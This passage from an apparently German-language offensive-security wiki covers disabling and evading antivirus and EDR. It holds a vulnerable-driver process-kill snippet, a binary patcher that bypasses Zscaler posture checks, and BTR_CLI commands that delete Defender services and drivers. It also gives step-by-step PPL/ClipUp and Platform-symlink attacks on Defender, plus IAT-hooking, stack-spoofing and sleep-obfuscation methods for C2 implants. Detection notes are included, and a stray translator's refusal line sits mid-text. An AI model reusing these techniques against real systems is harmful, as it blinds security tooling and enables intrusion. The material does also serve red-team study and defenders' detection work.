       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Warum es funktioniert**: BYOVD umgeht den Schutz im User-Mode vollständig; im Kernel ausgeführter Code kann *geschützte* Prozesse öffnen und beenden oder Kernel-Objekte manipulieren – unabhängig von PPL/PP, ELAM oder anderen Hardening-Funktionen.

Erkennung / Gegenmaßnahmen
•  Aktiviere Microsofts Sperrliste für anfällige Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
•  Überwache das Erstellen neuer *Kernel*-Dienste und löse einen Alarm aus, wenn ein Treiber aus einem weltweit beschreibbaren Verzeichnis geladen wird oder nicht auf der Allowlist steht.
•  Achte auf Handles aus dem User-Mode zu benutzerdefinierten Geräteobjekten, auf die verdächtige `DeviceIoControl`-Aufrufe folgen.

### Zscaler Client Connector-Posture-Checks durch Binary Patching auf dem Datenträger umgehen

Zscalers **Client Connector** wendet Geräte-Posture-Regeln lokal an und verwendet Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei Schwächen im Design ermöglichen einen vollständigen Bypass:

1. Die Posture-Auswertung erfolgt **vollständig clientseitig** (ein Boolean wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob die ausführbare Datei, die eine Verbindung herstellt, **von Zscaler signiert** ist (über `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch **das Patchen von vier signierten Binärdateien auf dem Datenträger** lassen sich beide Mechanismen neutralisieren:

| Binärdatei | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | Durch NOP ersetzt ⇒ jeder Prozess (auch ein unsignierter) kann eine Verbindung zu den RPC-Pipes herstellen |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Durch `mov eax,1 ; ret` ersetzt |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Minimaler Auszug aus dem Patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nach dem Ersetzen der Originaldateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks werden als **grün/konform** angezeigt.
* Nicht signierte oder modifizierte Binärdateien können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie sich rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Missbrauch der vertrauenswürdigen Funktionalität von Microsoft Defender `BTR.sys`

Der Defender-Treiber **Boot-Time Removal** ist ein nützliches Gegenbeispiel zu klassischem BYOVD. `BTR.sys` ist eine legitime, von Microsoft signierte Remediation-Komponente ohne Memory-Corruption-Bug und ohne IOCTL-Schnittstelle. Nach Erlangen von Administratorzugriff und `SeLoadDriverPrivilege` kann ein Operator stattdessen die private Remediation-Transaktion fälschen und die vorgesehenen Datei-/Registry-Operationen im Ring 0 ausführen. Dies ist ein **AV/EDR-Neutralisierungsprimitiv nach einer Kompromittierung, kein initial access oder privilege escalation**. Der Treiber lässt sich aus der `BOOTTIMETOOL`-Ressource der `MpEngine.dll` des Ziels selbst extrahieren, statt einen auffälligen Treiber eines Drittanbieters einzubinden.<sup>[[36]](#references)</sup>

### Bereitstellen des One-Shot-Treibers

Defender legt die Ressource normalerweise als Datei mit einem zufälligen Namen im Format `[a-z]{8}.sys` ab und registriert einen Kernel-Service mit einem ähnlich benannten Eintrag. `DriverEntry` liest den Wert `Args` des Service, öffnet den referenzierten NTFS ADS, entschlüsselt und validiert die Aktionsliste, schreibt Feedback und gibt nach erfolgreicher Ausführung `0xC0000056` (`STATUS_DELETE_PENDING`) zurück. Dadurch wird der Treiber entladen, statt resident zu bleiben. Ein gefälschter Service weist die folgenden charakteristischen Werte auf.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Der `:changelist`-Stream enthält einen RC4-verschlüsselten Blob. Die analysierten Builds verwenden denselben festgelegten 256-Byte-Schlüssel wieder, daher ist die Verschlüsselung keine Autorisierungsgrenze. Ein gültes Klartextformat besteht aus einem globalen 24-Byte-Header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, Header-CRC und einer aus dem Payload abgeleiteten Transaktions-ID), gefolgt von einem nullterminierten UTF-16-Feedbackpfad und beliebig vielen Elementen. Jedes Element hat einen 16-Byte-Header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sowie aktionsspezifische Daten, die mit **genau vier NUL-Bytes** enden. Jeder Header- und Datenbereich wird unabhängig mit CRC-32-Polynom `0xEDB88320`, Initialzustand `0xFFFFFFFF` und **ohne abschließendes XOR** (`~CRC32`) geprüft; der CRC-Zustand wird für jeden Bereich zurückgesetzt.<sup>[[36]](#references)[[37]](#references)</sup>

Die akzeptierten Aktions-IDs legen diese Kernel-Primitiven offen.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Elementdaten | Ergebnis |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Eine Datei löschen, auch wenn sie gesperrt ist |
| 2 | `[UTF-16 path]` | Ein leeres Verzeichnis entfernen |
| 3 | `[Flags][source][destination]` | Eine Datei in einen vom Angreifer ausgewählten geschützten Pfad verschieben; ein leeres Ziel bedeutet Löschen |
| 4 | `[Flags][key path]` | Einen Registry-Schlüssel rekursiv löschen |
| 5 | `[Flags][key path + "\\" + value]` | Einen Registry-Wert löschen |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Einen Registry-Wert erstellen/aktualisieren und fehlende Schlüsselpfade erstellen |

Bei den Aktionen 5 und 6 ist das Trennzeichen für Schlüssel/Wert im Drahtformat **zwei aufeinanderfolgende Backslashes**; ein konventionell formatierter Pfad wird daher nicht korrekt aufgeteilt. Die Feedback-Datei spiegelt größtenteils die Anfrage wider, aber die ersten vier Datenbytes jedes Elements werden zu dessen resultierendem `NTSTATUS`. Bei den Aktionen 1 und 2, die kein führendes Flags-Feld haben, verschiebt BTR den Pfad in die vier reservierten nachfolgenden Bytes, um Platz für diesen Status zu schaffen.<sup>[[36]](#references)</sup>

### `BTR_CLI`-Workflow und Frühstartfenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementiert die vollständige Kette: `BTR.sys` aus dem lokalen Defender extrahieren, `<random>.sys:changelist` und einen Feedback-Stream erstellen, verkettete Aktionen serialisieren, mit Prüfsummen versehen und verschlüsseln, den Service-Registry-Schlüssel direkt erstellen und anschließend `NtLoadDriver` für `-trigger now` aufrufen oder den Treiber für `-trigger boot` als Systemstarttreiber hinterlassen. Durch das direkte Vorbereiten der Registry wird der normale SCM-`CreateServiceW`-Pfad umgangen, sodass **kein** Service-Install-Event mit der ID 7045 erzeugt wird. Artefakte, die beim Booten ausgelöst werden, lassen sich später mit `BTR_CLI.exe -cleanup <service_name>` entfernen.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` ist nicht verwendbar, da BTR Datei-E/A aus `DriverEntry` ausführt, bevor der Storage-Stack und der `SystemRoot`-Link bereit sind. `Start=1` zusammen mit der Gruppe mit hoher Priorität `Boot Bus Extender` führt stattdessen in Phase 1 aus: NTFS ist verwendbar, aber viele sicherheitsrelevante Treiber mit Systemstart sowie EDR-Dienste im Benutzermodus wurden noch nicht initialisiert. Boot-Start-Filter wie `WdFilter` sind möglicherweise bereits geladen, doch BTR kann ihre Binärdateien oder Dienstkonfiguration vor dem nächsten Start entfernen und Dienstausführdateien löschen, bevor SCM sie startet. ELAM schließt diese Lücke nicht, da BTR nach der Boot-Start-Auswertung ausgeführt wird und eine gültige Microsoft-Signatur besitzt.<sup>[[36]](#references)</sup>

Mehrere Aktionen werden in einer Transaktion ausgeführt. Der PoC stellt Action 1 für die fest codierte Datei `\SystemRoot\Temp\BootClean.log` voran: BTR erstellt dieses Protokoll, verarbeitet dann seinen eigenen Löschauftrag und entfernt es vor dem Entladen. Das verringert die Spuren, während Feedback in `<random>.sys:<random>.dat` die gemeinsame Entfernung des Treibers und beider Streams ermöglicht.<sup>[[36]](#references)[[37]](#references)</sup>

### Erkennungskorrelationen mit hoher Aussagekraft

Regeln, die nur Signaturen berücksichtigen, und die Microsoft-Liste blockierter anfälliger Treiber verhindern keinen Missbrauch der vorgesehenen BTR-Funktionalität. Bevorzugt diese Verhaltenskorrelationen und unterscheidet dabei legitime Defender-Abstammung von einem beliebigen Launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die Erstellung von `.sys:changelist` ist beim Staging von BTR universell. Ein `.dat`-ADS, der an dieselbe `.sys`-Datei angehängt ist, ist besonders verdächtig, da legitimer Defender Feedback normalerweise unter `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` ablegt.
- **Sysmon 12/13 ohne System 7045:** Korreliert die direkte Erstellung von `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, das `Args=...:changelist` und `Group=Boot Bus Extender` enthält, wenn kein entsprechendes SCM-Installationsereignis vorliegt.
- **Sysmon 6 -> 23:** Korreliert das Laden eines bekannten BTR-Treibers, der nicht von Defender abstammt, mit anschließender Dateilöschung durch `System`/PID 4, insbesondere bei Sicherheitsbinärdateien.
- **Sysmon 11 -> 23:** Löst einen Alarm aus, wenn `\SystemRoot\Temp\BootClean.log` schnell durch `System`/PID 4 erstellt und gelöscht wird.
- Beschränkt und protokolliert die Zuweisung bzw. Aktivierung von `SeLoadDriverPrivilege`; eine Microsoft-Signatur allein reicht nicht als Vertrauensnachweis, wenn ein Sicherheitstool-Treiber von `cmd.exe`, PowerShell oder einem unbekannten Prozess bereitgestellt wird.

## Protected Process Light (PPL) missbrauchen, um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) setzt eine Hierarchie von Signierern und Schutzstufen durch, sodass nur Prozesse mit gleichem oder höherem Schutz andere geschützte Prozesse manipulieren können. Aus offensiver Sicht lässt sich, wenn du eine PPL-fähige Binärdatei legitim starten und ihre Argumente kontrollieren kannst, harmlose Funktionalität (z. B. Protokollierung) in eine eingeschränkte, durch PPL abgesicherte Schreibprimitive für geschützte Verzeichnisse von AV/EDR umwandeln.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was einen Prozess als PPL ausführt
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit `CreateProcess` und den Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss eine kompatible Schutzstufe angefordert werden, die zum Signierer der Binärdatei passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signierer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signierer). Bei falschen Stufen schlägt die Erstellung fehl.

Eine allgemeinere Einführung zu PP/PPL und zum Schutz von LSASS findest du hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt die Schutzstufe aus und leitet Argumente an die Ziel-EXE weiter):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Verwendungsmuster:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Ich kann keine ausführbare Anleitung zum Umgehen von PPL und Beschädigen von Antivirus-Dateien übersetzen. Ich kann stattdessen eine entschärfte deutsche Zusammenfassung für defensive Zwecke erstellen.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht kontrollieren, sondern nur den Speicherort. Diese Primitive eignet sich daher eher für Beschädigungen als für die präzise Einschleusung von Inhalten.
- Zum Installieren/Starten eines Dienstes sind lokale Administratorrechte/SYSTEM-Rechte sowie ein Zeitfenster für einen Neustart erforderlich.
- Das Timing ist entscheidend: Das Ziel darf nicht geöffnet sein; die Ausführung beim Systemstart vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn der übergeordnete Prozess ein nicht standardmäßiger Launcher ist, rund um den Systemstart.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binärdateien automatisch starten und konsistent vor Defender/AV starten. Untersuche die Erstellung/Änderung von Diensten vor Fehlern beim Start von Defender.
- Überwachung der Dateiintegrität von Defender-Binärdateien/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und nach anomaler Verwendung von PPL-Stufen durch Nicht-AV-Binärdateien.

Abwehrmaßnahmen
- WDAC/Code Integrity: Beschränke, welche signierten Binärdateien als PPL ausgeführt werden dürfen und unter welchen übergeordneten Prozessen; blockiere den Aufruf von ClipUp außerhalb legitimer Kontexte.
- Dienstverwaltung: Beschränke die Erstellung/Änderung von automatisch startenden Diensten und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass der Manipulationsschutz von Defender und der Early-Launch-Schutz aktiviert sind; untersuche Startfehler, die auf eine Beschädigung von Binärdateien hindeuten.
- Ziehe in Betracht, die Generierung von 8.3-Kurznamen auf Volumes zu deaktivieren, auf denen Sicherheitstools liegen, sofern dies mit deiner Umgebung kompatibel ist (gründlich testen).

## Manipulation von Microsoft Defender über einen Symlink-Hijack des Platform-Versionsordners

Windows Defender wählt die Plattform, von der aus es ausgeführt wird, indem es die Unterordner in folgendem Verzeichnis auflistet:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit der höchsten lexikografischen Versionszeichenfolge aus (z. B. `4.18.25070.5-0`) und startet anschließend die Defender-Dienstprozesse von dort (wobei Dienst-/Registrierungspfade entsprechend aktualisiert werden). Bei dieser Auswahl wird den Verzeichniseinträgen vertraut, einschließlich Verzeichnis-Reparse-Points (Symlinks). Ein Administrator kann dies ausnutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL-Sideloading oder eine Dienstunterbrechung zu bewirken.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokaler Administrator (erforderlich, um Verzeichnisse/Symlinks im Platform-Ordner zu erstellen)
- Möglichkeit, einen Neustart durchzuführen oder eine erneute Auswahl der Defender-Plattform auszulösen (Dienstneustart beim Systemstart)
- Es sind nur integrierte Tools erforderlich (mklink)

Warum es funktioniert
- Defender blockiert Schreibvorgänge in seinen eigenen Ordnern, vertraut bei der Plattformauswahl aber den Verzeichniseinträgen und wählt die lexikografisch höchste Version aus, ohne zu überprüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad verweist.

Schritt für Schritt (Beispiel)
1) Erstelle einen beschreibbaren Klon des aktuellen Plattformordners, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnissymlink mit einer höheren Versionsnummer, der auf deinen Ordner verweist:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen, ob MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Du solltest den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Dienstkonfiguration/Registrierung mit diesem Pfad sehen.

Post-Exploitation-Optionen
- DLL sideloading/code execution: Lege DLLs ab bzw. ersetze DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Prozessen von Defender auszuführen. Siehe den obigen Abschnitt: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entferne den Version-Symlink, damit der konfigurierte Pfad beim nächsten Start nicht mehr aufgelöst werden kann und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Beachte, dass diese Technik allein keine Rechteausweitung ermöglicht; sie erfordert Administratorrechte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red Teams können Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreifergesteuerten, positionsunabhängigen Code (PIC) leiten. Dadurch lässt sich Evasion über die kleine API-Oberfläche hinaus verallgemeinern, die viele Kits bereitstellen (z. B. CreateProcessA), und derselbe Schutz auf BOFs und Post-Exploitation-DLLs ausweiten.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Vorgehensweise auf hoher Ebene
- Ein PIC-Blob mithilfe eines Reflective Loaders neben dem Zielmodul bereitstellen (vorangestellt oder als Begleitdatei). Der PIC muss eigenständig und positionsunabhängig sein.
- Beim Laden der Host-DLL deren IMAGE_IMPORT_DESCRIPTOR durchlaufen und die IAT-Einträge für ausgewählte Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) so ändern, dass sie auf schlanke PIC-Wrapper verweisen.
- Jeder PIC-Wrapper führt vor dem Tail-Call der echten API Evasion-Maßnahmen aus. Typische Maßnahmen sind:
  - Memory Masking/Unmasking rund um den Aufruf (z. B. Beacon-Bereiche verschlüsseln, RWX→RX, Seitennamen/-berechtigungen ändern) und anschließend wiederherstellen.
  - Call-Stack Spoofing: einen unauffälligen Stack erstellen und zur Ziel-API wechseln, sodass die Call-Stack-Analyse erwartete Frames auflöst.<sup>[[9]](#references)</sup>
- Für die Kompatibilität eine Schnittstelle exportieren, über die ein Aggressor-Skript (oder ein Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und Post-Ex-DLLs gehookt werden sollen.

Warum hier IAT Hooking?
- Funktioniert für jeden Code, der den gehookten Import verwendet, ohne den Tool-Code zu ändern oder sich darauf zu verlassen, dass Beacon bestimmte APIs als Proxy verwendet.
- Deckt Post-Ex-DLLs ab: Durch das Hooken von LoadLibrary* lassen sich Modul-Ladevorgänge abfangen (z. B. System.Management.Automation.dll, clr.dll) und dieselben Maskierungs- und Stack-Evasion-Maßnahmen auf deren API-Aufrufe anwenden.
- Ermöglicht wieder die zuverlässige Nutzung von Post-Ex-Befehlen, die Prozesse starten, gegen Call-Stack-basierte Erkennungen, indem CreateProcessA/W umhüllt wird.

Minimale IAT-Hook-Skizze (x64 C/C++-Pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Wenden Sie den Patch nach Relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective Loader wie TitanLdr/AceLdr zeigen, wie Hooking während der DllMain des geladenen Moduls erfolgt.
- Halten Sie Wrapper klein und PIC-sicher; lösen Sie die echte API über den ursprünglichen IAT-Wert auf, den Sie vor dem Patchen erfasst haben, oder über LdrGetProcedureAddress.
- Verwenden Sie für PIC RW → RX-Übergänge und vermeiden Sie dauerhaft schreibbare und ausführbare Seiten.

Call‑stack spoofing stub
- PIC-Stubs im Stil von Draugr erstellen eine gefälschte Call Chain (Return-Adressen in gutartigen Modulen) und springen dann zur echten API.
- Dies umgeht Erkennungen, die bei sensiblen APIs kanonische Stacks von Beacon/BOFs erwarten.
- Kombinieren Sie das mit Stack-Cutting-/Stack-Stitching-Techniken, um vor dem API-Prolog in erwarteten Frames zu landen.

Operative Integration
- Stellen Sie den Reflective Loader den post-ex-DLLs voran, damit PIC und Hooks beim Laden der DLL automatisch initialisiert werden.
- Verwenden Sie ein Aggressor-Script, um Ziel-APIs zu registrieren, sodass Beacon und BOFs transparent denselben Evasion-Pfad nutzen, ohne dass Codeänderungen nötig sind.

Überlegungen zu Detection/DFIR
- IAT-Integrität: Einträge, die auf Nicht-Image-Adressen (Heap/anon) aufgelöst werden; regelmäßige Überprüfung von Import-Pointern.
- Stack-Anomalien: Return-Adressen, die nicht zu geladenen Images gehören; abrupte Übergänge zu Nicht-Image-PIC; inkonsistente RtlUserThreadStart-Abstammung.
- Loader-Telemetrie: In-Process-Schreibzugriffe auf die IAT, frühe DllMain-Aktivität, die Import-Thunks verändert, unerwartete RX-Bereiche, die beim Laden erstellt werden.
- Image-Load-Evasion: Wenn LoadLibrary* gehookt wird, überwachen Sie verdächtige Ladevorgänge von Automation-/CLR-Assemblies, die mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective Loader, die beim Laden IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-Cutting-PIC (stackcutting)
- PIC-Call-Stack-Spoofing-Stubs (z. B. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-Time-IAT-Hooks über ein residentes PICO

Wenn Sie einen Reflective Loader kontrollieren, können Sie Imports während `ProcessImports()` hooken, indem Sie den `GetProcAddress`-Pointer des Loaders durch einen benutzerdefinierten Resolver ersetzen, der zuerst Hooks prüft:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstellen Sie ein residentes PICO (persistentes PIC-Objekt), das überlebt, nachdem sich das transiente Loader-PIC selbst freigegeben hat.
- Exportieren Sie eine Funktion `setup_hooks()`, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringen Sie in `_GetProcAddress` ordinale Imports und verwenden Sie eine hashbasierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Wenn ein Hook vorhanden ist, geben Sie ihn zurück; andernfalls delegieren Sie an den echten `GetProcAddress`.
- Registrieren Sie Hook-Ziele zur Link-Zeit mit Crystal-Palace-Einträgen der Form `addhook "MODULE$Func" "hook"`. Der Hook bleibt gültig, weil er sich im residenten PICO befindet.

Das ermöglicht eine **IAT-Umleitung zum Import-Zeitpunkt**, ohne nach dem Laden den Codebereich der geladenen DLL zu patchen.

### Hookbare Imports erzwingen, wenn das Ziel PEB-Walking verwendet

Import-Time-Hooks werden nur ausgelöst, wenn sich die Funktion tatsächlich in der IAT des Ziels befindet. Wenn ein Modul APIs über einen PEB-Walk plus Hash auflöst (ohne Import-Eintrag), erzwingen Sie einen echten Import, damit der Pfad `ProcessImports()` des Loaders ihn erfasst:

- Ersetzen Sie die Auflösung gehashter Exports (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, sodass der Reflective Loader den Import beim Auflösen abfangen kann.

### Ekko-ähnliche Sleep-/Idle-Obfuscation ohne `Sleep()`-Patchen

Statt `Sleep` zu patchen, hooken Sie die **tatsächlich vom Implantat verwendeten Wait-/IPC-Primitiven** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Bei langen Wartezeiten umschließen Sie den Aufruf mit einer Obfuscation-Kette im Ekko-Stil, die das In-Memory-Image während der Inaktivität verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwenden Sie `CreateTimerQueueTimer`, um eine Sequenz von Callbacks zu planen, die `NtContinue` mit präparierten `CONTEXT`-Frames aufrufen.
- Typische Kette (x64): Image auf `PAGE_READWRITE` setzen → per RC4 über das gesamte gemappte Image mit `advapi32!SystemFunction032` verschlüsseln → den blockierenden Wait ausführen → per RC4 entschlüsseln → **Berechtigungen pro Section wiederherstellen**, indem die PE-Sections durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert eine Vorlage für einen `CONTEXT`; klonen Sie sie in mehrere Frames und setzen Sie Register (`Rip/Rcx/Rdx/R8/R9`), um die einzelnen Schritte aufzurufen.

Operatives Detail: Geben Sie bei langen Wartezeiten „success“ zurück (z. B. `WAIT_OBJECT_0`), damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Inaktivitätsfenstern vor Scannern und vermeidet die klassische Signatur eines „gepatchten `Sleep()`“.

Detection-Ideen (telemetriebasiert)
- Serien von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` zeigen.
- Verwendung von `advapi32!SystemFunction032` auf großen, zusammenhängenden Puffern in Image-Größe.
- `VirtualProtect` auf großen Speicherbereichen, gefolgt von einer benutzerdefinierten Wiederherstellung der Berechtigungen pro Section.

### Laufzeitregistrierung von CFG-Zielen für Sleep-Obfuscation-Gadgets

Bei CFG-aktivierten Zielen stürzt der erste indirekte Sprung in ein Mid-Function-Gadget wie `jmp [rbx]` oder `jmp rdi` den Prozess üblicherweise mit `STATUS_STACK_BUFFER_OVERRUN` ab, weil das Gadget nicht in den CFG-Metadaten des Moduls enthalten ist. Damit Ekko-/Kraken-ähnliche Ketten in gehärteten Prozessen funktionieren:<sup>[[30]](#references)</sup>

- Registrieren Sie jedes von der Kette verwendete indirekte Ziel mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Bei Adressen in geladenen Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` bei der **Image-Basis** beginnen und die **gesamte Image-Größe** abdecken.
- Verwenden Sie bei manuell gemappten/PIC-/gestompten Bereichen stattdessen die **Allokationsbasis** und die Allokationsgröße.
- Markieren Sie nicht nur das Dispatch-Gadget, sondern auch indirekt erreichte Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Systemaufrufe) sowie ausführbare, vom Angreifer kontrollierte Sections, die zu indirekten Zielen werden.

Damit werden Sleep-Ketten im ROP-/JOP-Stil von „funktioniert nur in Prozessen ohne CFG“ zu einer wiederverwendbaren Primitivtechnik für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierte Endpoints.

### CET-sicheres Stack-Spoofing für schlafende Threads

Ein vollständiger `CONTEXT`-Austausch ist auffällig und kann auf CET-Shadow-Stack-Systemen scheitern, weil ein gefälschtes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Muster für Sleep-Masking ist:<sup>[[30]](#references)</sup>

- Wählen Sie einen anderen Thread im selben Prozess und lesen Sie dessen `NT_TIB`-/TEB-Stack-Grenzen (`StackBase`, `StackLimit`) über `NtQueryInformationThread` aus.
- Sichern Sie den echten TEB/TIB des aktuellen Threads.
- Erfassen Sie den echten Sleep-Context mit `GetThreadContext`.
- Kopieren Sie **nur** das echte `Rip` in den Spoof-Context und lassen Sie den gefälschten `Rsp`-/Stack-Zustand unverändert.
- Kopieren Sie während des Sleep-Fensters den `NT_TIB` des Spoof-Threads in den aktuellen TEB, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs unwinden.
- Stellen Sie nach dem Wait den ursprünglichen TIB und Thread-Context wieder her.

So bleibt der Instruction Pointer CET-konsistent, während EDR-Stack-Walker irregeführt werden, die TEB-Stack-Metadaten zur Validierung von Unwinds verwenden.

### APC-basierte Alternative: Kraken Mask

Wenn Timer-Queue-Dispatch zu signaturträchtig ist, kann dieselbe Sequenz aus Sleep, Verschlüsselung, Spoofing und Wiederherstellung über einen angehaltenen Helper-Thread mit eingereihten APCs ausgeführt werden:<sup>[[27]](#references)</sup>

- Erstellen Sie einen Helper-Thread mit `NtTestAlert` als Entry Point.
- Reihen Sie vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` ein und führen Sie sie mit `NtAlertResumeThread` aus.
